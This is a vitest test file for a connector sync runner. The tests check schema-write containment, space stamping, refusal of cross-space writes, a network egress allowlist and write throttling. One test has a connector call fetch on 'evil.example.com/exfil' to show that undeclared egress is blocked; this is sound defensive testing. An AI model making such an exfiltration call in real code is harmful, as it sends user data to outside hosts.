/**
 * Tests for the Connector primitive + sync runner (exploration 0196). These
 * cover the governance guarantees: schema-write containment, egress containment,
 * required-space + no-cross-space-leak, and the connector write budget.
 */

import type {
  ConnectorDefinition,
  ConnectorStore,
  ConnectorFetch
} from '../connectors/define-connector'
import { describe, it, expect, vi } from 'vitest'
import {
  ConnectorDefinitionError,
  ConnectorSyncError,
  defineConnector,
  runConnectorSync
} from '../connectors'
import { CapabilityError } from '../ecosystem/capability-guard'
import { createConnectorWriteGuardrail } from '../services/mcp-guardrail'

const SLACK_MESSAGE = 'xnet://dev.xnet/SlackMessage@1.0.0'

function slackDef(overrides: Partial<ConnectorDefinition> = {}): ConnectorDefinition {
  return {
    id: 'dev.xnet.connector.slack',
    name: 'Slack',
    capabilities: {
      secrets: ['SLACK_BOT_TOKEN'],
      schemaWrite: [SLACK_MESSAGE],
      network: ['slack.com']
    },
    sync: {
      schemas: [SLACK_MESSAGE],
      pull: async ({ store, space }) => {
        await store.create({ schemaId: SLACK_MESSAGE, properties: { text: 'hi', space } })
        return { written: 1 }
      }
    },
    ...overrides
  }
}

/** A minimal in-memory store recording every create. */
function memStore(): ConnectorStore & {
  created: Array<{ schemaId: string; properties: Record<string, unknown> }>
} {
  const created: Array<{ schemaId: string; properties: Record<string, unknown> }> = []
  let n = 0
  return {
    created,
    async create({ schemaId, properties }) {
      created.push({ schemaId, properties })
      return { id: `n${++n}`, schemaId }
    },
    async get() {
      return null
    },
    async update() {
      return {}
    }
  }
}

describe('defineConnector', () => {
  it('produces a FeatureModule pointing at the <id>.sync hub feature', () => {
    const connector = defineConnector(slackDef())
    expect(connector.module.id).toBe('dev.xnet.connector.slack')
    expect(connector.module.hub).toEqual({ featureId: 'dev.xnet.connector.slack.sync' })
    expect(connector.module.capabilities?.schemaWrite).toEqual([SLACK_MESSAGE])
  })

  it('exposes agentTools through the module contributions', () => {
    const connector = defineConnector(
      slackDef({
        agentTools: [
          {
            id: 'dev.xnet.connector.slack.search',
            name: 'slack_search',
            description: 'Search',
            invoke: () => []
          }
        ]
      })
    )
    expect(connector.module.contributes?.agentTools?.map((t) => t.name)).toEqual(['slack_search'])
  })

  it('rejects a synced schema not covered by schemaWrite', () => {
    expect(() =>
      defineConnector(
        slackDef({
          capabilities: { schemaWrite: ['xnet://dev.xnet/Other@1.0.0'], network: ['slack.com'] }
        })
      )
    ).toThrow(ConnectorDefinitionError)
  })

  it('rejects a connector that declares no network host', () => {
    expect(() =>
      defineConnector(slackDef({ capabilities: { schemaWrite: [SLACK_MESSAGE], network: [] } }))
    ).toThrow(ConnectorDefinitionError)
  })

  it('rejects a non-reverse-domain id', () => {
    expect(() => defineConnector(slackDef({ id: 'slack' }))).toThrow(ConnectorDefinitionError)
  })
})

describe('runConnectorSync — governance', () => {
  it('requires a target space unless allowUnscoped', async () => {
    const def = slackDef()
    await expect(
      runConnectorSync(def, { env: {}, fetch: vi.fn(), store: memStore(), space: null })
    ).rejects.toThrow(ConnectorSyncError)
  })

  it('stamps the target space onto every synced node (cascade boundary)', async () => {
    const def = slackDef({
      sync: {
        schemas: [SLACK_MESSAGE],
        // Author "forgets" the space; the runner must still stamp it.
        pull: async ({ store }) => {
          await store.create({ schemaId: SLACK_MESSAGE, properties: { text: 'hi' } })
          return { written: 1 }
        }
      }
    })
    const store = memStore()
    await runConnectorSync(def, { env: {}, fetch: vi.fn(), store, space: 'space-A' })
    expect(store.created[0].properties.space).toBe('space-A')
  })

  it('refuses a write that targets a different space (no cross-space leak)', async () => {
    const def = slackDef({
      sync: {
        schemas: [SLACK_MESSAGE],
        pull: async ({ store }) => {
          await store.create({
            schemaId: SLACK_MESSAGE,
            properties: { text: 'hi', space: 'space-B' }
          })
          return { written: 1 }
        }
      }
    })
    await expect(
      runConnectorSync(def, { env: {}, fetch: vi.fn(), store: memStore(), space: 'space-A' })
    ).rejects.toThrow(/cross-space write refused/)
  })

  it('contains writes to declared schemaWrite (CapabilityError otherwise)', async () => {
    const def = slackDef({
      sync: {
        schemas: [SLACK_MESSAGE],
        pull: async ({ store }) => {
          await store.create({
            schemaId: 'xnet://dev.xnet/Secret@1.0.0',
            properties: { space: 'space-A' }
          })
          return { written: 1 }
        }
      }
    })
    await expect(
      runConnectorSync(def, { env: {}, fetch: vi.fn(), store: memStore(), space: 'space-A' })
    ).rejects.toThrow(CapabilityError)
  })

  it('contains egress to declared network hosts', async () => {
    const rawFetch: ConnectorFetch = vi.fn(async () => ({ ok: true }))
    const def = slackDef({
      sync: {
        schemas: [SLACK_MESSAGE],
        pull: async ({ fetch, store, space }) => {
          await fetch('https://evil.example.com/exfil') // not in network allowlist
          await store.create({ schemaId: SLACK_MESSAGE, properties: { space } })
          return { written: 1 }
        }
      }
    })
    await expect(
      runConnectorSync(def, { env: {}, fetch: rawFetch, store: memStore(), space: 'space-A' })
    ).rejects.toThrow(CapabilityError)
    expect(rawFetch).not.toHaveBeenCalled() // blocked before the request leaves
  })

  it('allows egress to a declared host and passes scoped env to pull', async () => {
    const rawFetch: ConnectorFetch = vi.fn(async () => ({ ok: true }))
    let seenToken: string | undefined
    const def = slackDef({
      sync: {
        schemas: [SLACK_MESSAGE],
        pull: async ({ env, fetch, store, space }) => {
          seenToken = env.SLACK_BOT_TOKEN
          await fetch('https://slack.com/api/conversations.history')
          await store.create({ schemaId: SLACK_MESSAGE, properties: { space } })
          return { written: 1 }
        }
      }
    })
    const result = await runConnectorSync(def, {
      env: { SLACK_BOT_TOKEN: 'xoxb-123' },
      fetch: rawFetch,
      store: memStore(),
      space: 'space-A'
    })
    expect(result.written).toBe(1)
    expect(seenToken).toBe('xoxb-123')
    expect(rawFetch).toHaveBeenCalledOnce()
  })

  it('throttles a runaway sync on the connector write budget', async () => {
    // A tiny budget: 2 writes per window. The 3rd create is blocked.
    const guardrail = createConnectorWriteGuardrail({
      budgetPolicy: {
        limits: [{ scope: 'surface', unitsPerWindow: 2, windowMs: 60_000 }],
        defaultCostUnits: 1
      }
    })
    const def = slackDef({
      sync: {
        schemas: [SLACK_MESSAGE],
        pull: async ({ store, space }) => {
          for (let i = 0; i < 5; i++) {
            await store.create({ schemaId: SLACK_MESSAGE, properties: { space } })
          }
          return { written: 5 }
        }
      }
    })
    await expect(
      runConnectorSync(def, {
        env: {},
        fetch: vi.fn(),
        store: memStore(),
        space: 'space-A',
        guardrail
      })
    ).rejects.toThrow(/budget/)
  })
})
